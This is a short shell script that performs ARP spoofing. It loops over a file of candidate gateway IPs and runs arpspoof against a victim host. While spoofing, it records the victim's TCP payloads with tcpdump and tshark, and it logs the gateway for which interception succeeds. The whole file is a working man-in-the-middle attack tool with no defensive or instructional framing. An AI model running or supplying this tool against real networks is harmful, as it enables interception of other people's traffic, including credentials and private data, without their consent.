#!/bin/sh

source="$1"
interface="$2"
input_file="reachable_ips.txt"
successful_ips="successful_ips.txt"

touch capt.pcap

while IFS= read -r ip_addr; do
    echo "Using Gateway = $ip_addr"

    sudo rm capt.pcap
    # Start packet capture using tcpdump
    sudo tcpdump -i "$interface" -w capt.pcap &
    tcpdump_pid=$!

    sudo tshark -f "tcp and src host $source and dst host $ip_addr" -Y "tcp.payload" &> x.txt &
    tshark_pid=$!

    sudo arpspoof -i "$interface" -t "$source" -r "$ip_addr" &> /dev/null &
    arpspoof_pid=$!

    sleep 30 # Wait for a bit to allow packet capture

    # Check if arpspoof is still running before attempting to kill it
    if ps -p $arpspoof_pid > /dev/null; then
        sudo kill $arpspoof_pid
    fi
   
    sleep 30  # Allow time for packet capture

    # Clean up the tshark process
    if ps -p $tshark_pid > /dev/null; then
        sudo kill $tshark_pid
    fi

    # Clean up the tcpdump process
    if ps -p $tcpdump_pid > /dev/null; then
        sudo kill $tcpdump_pid
    fi

    # Check the output from tshark
    if [ -s x.txt ]; then  # Only proceed if x.txt is not empty
        output="$(cat x.txt)"
       
        if echo "$output" | grep -q "$source → $ip_addr"; then
            echo "Spoofing successful:"
            echo "$ip_addr" >> "$successful_ips"  # Save successful IPs
            break
        else
            echo "Spoofing failed"
        fi
    else
        echo "No packets captured in x.txt"
    fi
   
    # Clear the output file for the next iteration
    > x.txt  
     # Clear the contents of capture.pcapng for the next iteration
  

done < "$input_file"

